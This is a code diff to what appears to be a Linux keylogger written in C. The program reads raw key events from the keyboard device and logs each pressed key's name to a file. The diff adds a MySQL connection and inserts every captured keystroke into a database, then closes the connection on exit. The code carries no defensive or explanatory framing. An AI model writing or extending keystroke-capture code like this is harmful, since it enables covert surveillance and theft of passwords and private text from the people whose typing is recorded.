@@ -12,6 +12,7 @@
 #include "util.h"
 #include "options.h"
 #include "config.h"
+#include "mysql_handler.h"
 
 #define KEY_RELEASE 0
 #define KEY_PRESS 1
@@ -55,7 +56,9 @@ int main(int argc, char **argv) {
 
    int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
    assert(kbd_fd > 0);
-
+   /*setup mysql */
+   MYSQL *con;
+   setup_mysql(&con);
    FILE *logfile = fopen(config.logFile, "a");
    if (logfile == NULL) {
       LOG_ERROR("Could not open log file");
@@ -84,6 +87,7 @@ int main(int argc, char **argv) {
             if (strcmp(name, UNKNOWN_KEY) != 0) {
                LOG("%s", name);
                fputs(name, logfile);
+               insert_data(con, name);
             }
          } else if (event.value == KEY_RELEASE) {
             if (isShift(event.code)) {
@@ -97,5 +101,6 @@ int main(int argc, char **argv) {
    Config_cleanup(&config);
    fclose(logfile);
    close(kbd_fd);
+   close_mysql(con);
    return 0;
 }
